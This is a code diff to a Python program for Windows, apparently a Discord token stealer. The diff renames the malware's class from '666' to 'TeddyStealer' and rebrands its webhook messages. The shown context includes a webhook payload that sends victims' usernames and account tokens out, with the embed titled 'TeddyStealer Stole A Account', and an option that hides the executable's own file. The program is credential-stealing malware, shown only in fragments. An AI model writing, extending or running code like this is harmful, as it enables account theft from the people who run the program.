@@ -51,7 +51,7 @@ class functions(object):
             return json.dumps(info)
 
 
-class 666(functions):
+class TeddyStealer(functions):
     def __init__(self):
         super().__init__()
         self.tokens = []
@@ -72,10 +72,10 @@ class 666(functions):
             if "username" in user:
                 if config.get('webhook'):
                     webhook_data = {
-                        "username": "666",
+                        "username": "TeddyStealer",
                         "embeds": [
                             {
-                                "title": '666 Info',
+                                "title": 'TeddyStealer Stole A Account',
                                 "color": color,
                                 'fields': [
                                     {
@@ -89,7 +89,7 @@ class 666(functions):
                                         "inline": True
                                     },
                                     {   
-                                        "name": "DS Token",
+                                        "name": " Token",
                                         "value": f"||{token}||",
                                         "inline": False
                                     },
@@ -187,4 +187,4 @@ class 666(functions):
 if __name__ == "__main__" and os.name == 'nt':
     if config.get('hide_self'):
         ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 2)
-    666()
+    TeddyStealer()
